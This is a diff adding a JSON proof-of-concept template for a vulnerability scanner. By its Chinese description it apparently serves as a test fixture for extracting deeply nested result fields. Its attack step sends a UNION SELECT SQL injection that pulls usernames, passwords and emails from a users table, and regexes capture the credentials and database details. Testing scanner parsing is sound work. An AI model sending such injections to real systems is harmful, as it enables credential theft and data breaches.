@@ -1,0 +1,61 @@
+{
+  "pocInfo": {
+    "vulID": "deep-nested-001",
+    "version": "1",
+    "name": "Deep Nested Result Extraction",
+    "protocol": "http",
+    "vulType": "SQL Injection",
+    "author": "TestAuthor",
+    "desc": "测试深层嵌套的result字段提取"
+  },
+  "pocExecute": {
+    "verify": [
+      {
+        "step": "0",
+        "method": "GET",
+        "vulPath": "/api/user",
+        "params": "id=1",
+        "status": "200",
+        "match": {
+          "regex": ["user_id"]
+        }
+      }
+    ],
+    "attack": [
+      {
+        "step": "0",
+        "method": "GET",
+        "vulPath": "/api/user",
+        "params": "id=1' UNION SELECT username,password,email FROM users--",
+        "status": "200",
+        "match": {
+          "regex": ["username.*password"]
+        },
+        "result": {
+          "AdminInfo": {
+            "Username": "<regex>username:([^\\s]+)",
+            "Password": "<regex>password:([^\\s]+)",
+            "Profile": {
+              "Email": "<regex>email:([^\\s]+)",
+              "Phone": "<regex>phone:([^\\s]+)",
+              "Details": {
+                "Address": "<regex>address:([^\\n]+)",
+                "City": "<regex>city:([^\\s]+)"
+              }
+            }
+          },
+          "DBInfo": {
+            "Database": "<regex>database:([^\\s]+)",
+            "Tables": {
+              "TableName": "<regex>table:([^\\s]+)",
+              "Columns": {
+                "ColumnName": "<regex>column:([^\\s]+)"
+              }
+            }
+          }
+        }
+      }
+    ]
+  }
+}
+
